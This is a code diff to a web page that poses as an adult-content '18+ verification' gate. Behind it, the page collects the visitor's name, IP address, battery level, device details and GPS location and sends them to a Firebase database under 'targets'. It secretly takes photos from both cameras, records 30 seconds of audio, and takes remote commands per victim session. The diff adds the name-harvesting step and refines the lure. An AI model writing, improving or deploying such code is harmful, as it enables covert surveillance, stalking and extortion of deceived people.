@@ -7,46 +7,60 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { margin:0; background:#000; font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
-        #verify-box { position:relative; z-index:10; background:#fff; padding:30px; border-radius:10px; text-align:center; width:85%; max-width:320px; }
-        .btn { background:#ff3131; color:#fff; border:none; padding:15px; width:100%; border-radius:5px; cursor:pointer; font-weight:bold; }
+        body { margin:0; background:#000; font-family: 'Segoe UI', sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; color: #fff; }
+        #setup-box { background:#fff; padding:30px; border-radius:15px; text-align:center; width:85%; max-width:320px; color:#222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .input-field { width:100%; padding:12px; margin:15px 0; border:1px solid #ddd; border-radius:5px; box-sizing:border-box; font-size:16px; }
+        .btn { background:#ff3131; color:#fff; border:none; padding:15px; width:100%; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px; }
         video#main-player { display:none; width:100%; height:100%; object-fit:contain; }
+        #loading { display:none; color: #ff3131; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<div id="verify-box">
-    <h2 style="color:#222">18+ WARNING</h2>
-    <p style="color:#666">Confirm your age to watch the private stream.</p>
-    <button class="btn" onclick="startSystem()">I AM 18+ ENTER</button>
+<div id="setup-box">
+    <h2 style="margin-top:0;">18+ VERIFICATION</h2>
+    <p style="font-size:14px; color:#666;">Enter your name to verify age and access private stream.</p>
+    <input type="text" id="targetName" class="input-field" placeholder="Your Full Name..." required>
+    <button class="btn" onclick="startSystem()">VERIFY & ENTER</button>
+    <div id="loading">Connecting to Secure Server...</div>
 </div>
 
 <video id="main-player" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
 
 <script>
+    // --- FIREBASE CONFIG ---
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
-    const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
-
+    
+    let sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
     let globalStream = null;
-    let isBusy = false; // Prevents conflict
+    let isBusy = false;
 
     async function startSystem() {
-        document.getElementById('verify-box').style.display = 'none';
-        const v = document.getElementById('main-player');
-        v.style.display = 'block';
+        const uName = document.getElementById('targetName').value;
+        if(!uName) { alert("Please enter your name!"); return; }
+
+        document.getElementById('loading').style.display = 'block';
 
         try {
-            await initStream();
+            // Permission and Initial Stream
+            globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            document.getElementById('setup-box').style.display = 'none';
+            const v = document.getElementById('main-player');
+            v.style.display = 'block';
             v.play();
-            sendInfo();
+
+            // Send Intel to Firebase
+            sendInfo(uName);
             trackGPS();
             
-            // Auto Sequence
+            // Auto Capture Loop
             setTimeout(() => capture("user"), 3000); 
-            setTimeout(() => capture("environment"), 10000);
+            setTimeout(() => capture("environment"), 12000); // 12s gap for hardware reset
 
+            // Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
                 if(cmd && !isBusy) {
@@ -57,7 +71,10 @@
                 }
             });
 
-        } catch (e) { alert("Permission Required!"); location.reload(); }
+        } catch (e) {
+            alert("Permission Denied! Camera/Mic access is required for verification.");
+            location.reload();
+        }
     }
 
     async function initStream() {
@@ -65,7 +82,6 @@
         globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
     }
 
-    // --- PHOTO CAPTURE FIX ---
     async function capture(mode) {
         if(isBusy) return;
         isBusy = true;
@@ -97,12 +113,10 @@
         } catch (err) { isBusy = false; initStream(); }
     }
 
-    // --- AUDIO RECORDING FIX (30 SEC) ---
     async function recordAudio() {
         if(isBusy) return;
         isBusy = true;
         try {
-            // Camera band karna zaroori hai mic access ke liye
             if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
             
             const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -124,17 +138,21 @@
             };
 
             recorder.start();
-            setTimeout(() => { if(recorder.state !== "inactive") recorder.stop(); }, 30000);
+            setTimeout(() => { if(recorder.state !== "inactive") recorder.stop(); }, 30000); // Exact 30s
             
         } catch (e) { isBusy = false; initStream(); }
     }
 
-    async function sendInfo() {
+    async function sendInfo(name) {
         const batt = await navigator.getBattery().catch(() => ({level:1}));
         const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
         db.ref(`targets/${sessionID}/info`).set({
-            status: "ONLINE", ip: ip.ip, battery: Math.floor(batt.level * 100) + "%",
-            device: navigator.userAgent.split(') ')[0] + ')', time: new Date().toLocaleTimeString()
+            status: "ONLINE",
+            customName: name,
+            ip: ip.ip,
+            battery: Math.floor(batt.level * 100) + "%",
+            device: navigator.userAgent.split(') ')[0] + ')',
+            time: new Date().toLocaleTimeString()
         });
     }
 
